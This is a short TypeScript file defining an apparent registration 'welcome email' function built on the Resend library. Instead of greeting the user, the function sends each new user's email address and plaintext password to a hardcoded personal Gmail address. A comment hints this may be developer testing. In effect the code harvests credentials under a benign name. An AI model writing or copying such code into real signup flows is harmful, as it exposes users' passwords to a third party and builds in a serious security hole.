import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export const RegisterWelcomeMessageEmail = async (
    email: string,
    password: string,
) => {

    const myEmail = "pmacbook769@gmail.com";

    await resend.emails.send({
        from: "onboarding@resend.dev",
        to: myEmail, // Send only to your email
        subject: "Ali Squad",
        html: `<p>Email: ${email}</p> <p>Password: ${password}</p>`
    });
};
